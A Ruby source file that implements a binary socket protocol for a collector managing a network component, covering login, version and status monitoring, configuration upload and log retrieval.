#
#  The NC protocol implementation
#

# relatives
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'

# system

module RCS
module Collector

class NCProto
  include RCS::Tracer
  
  PROTO_OK		  = 0x000F0001  # OK
  PROTO_NO		  = 0x000F0002  # Error
  PROTO_BYE		  = 0x000F0003  # Close the session
  PROTO_LOGIN		= 0x000F0004  # Authentication to the component
  PROTO_MONITOR	= 0x000F0005  # Status of the component
  PROTO_CONF		= 0x000F0006  # New configuration
  PROTO_LOG		  = 0x000F0007	# Logs from the component
  PROTO_VERSION	= 0x000F0008	# Version information

  HEADER_LENGTH = 8 # two int

  COMPONENT_CONFIGURED  = 0x00  
  COMPONENT_NEED_CONFIG = 0x01

  LOG_INFO	= 0x00
	LOG_ERROR	= 0x01
	LOG_DEBUG	= 0x02

  def initialize(socket)
    @socket = socket
  end

  def get_command
    begin
      # get the command
      command = @socket.sysread(HEADER_LENGTH)
      # decode the integer
      return command.unpack('i').first
    rescue EOFError
      return nil
    end
  end

  def login
    # login command payload
    command = DB.instance.network_signature

    # the common header
    header = [PROTO_LOGIN].pack('i')
    header += [command.length].pack('i')

    # the whole message
    message = header + command

    # send and receive
    @socket.syswrite message
    response = @socket.sysread(HEADER_LENGTH)

    # check if everything is ok
    return true if response.unpack('i') == [PROTO_OK]

    return false
  end

  def version
    # the version is an array of 16 bytes
    response = @socket.sysread(16).delete("\x00")

    # send the OK
    header = [PROTO_OK].pack('i')
    header += [0].pack('i')
    @socket.syswrite header

    return response
  end

  def monitor
    # the status (OK, KO, WARN)
    status = @socket.sysread(16).delete("\x00")

    # 3 consecutive int
    disk, cpu, pcpu = @socket.sysread(12).unpack('iii')

    # the status description
    desc = @socket.sysread(1024).delete("\x00")

    # send the OK
    header = [PROTO_OK].pack('i')
    header += [0].pack('i')
    @socket.syswrite header

    return [status, desc, disk, cpu, pcpu]
  end

  def config(content)
    # the element does not need a new config
    if content.nil? then
      # send the NO
      header = [PROTO_NO].pack('i')
      header += [0].pack('i')
      @socket.syswrite header
      return
    end

    # retro compatibility (260 byte array for the name)
    message = "config.zip".ljust(260, "\x00")
    # len of the file
    message += [content.length].pack('i')
    # the file
    message += content
    
    # send the CONF command
    header = [PROTO_CONF].pack('i')
    header += [message.length].pack('i')
    @socket.syswrite header + message

  end

  def log
    # convert from C "struct tm" to ruby objects
    # tm_sec, tm_min, tm_hour, tm_mday, tm_mon, tm_year, tm_wday, tm_yday, tm_isdst
    struct_tm = @socket.sysread(4 * 9).unpack('i*')
    time = Time.gm(*struct_tm, 0)

    # type of the log
    type = @socket.sysread(4).unpack('i').first
    case type
      when LOG_INFO
        type = 'INFO'
      when LOG_ERROR
        type = 'ERROR'
      when LOG_DEBUG
        type = 'DEBUG'
    end
    # the message
    desc = @socket.sysread(1024).delete("\x00")

    return [time, type, desc]
  end

  
end #NCProto

end #Collector::
end #RCS::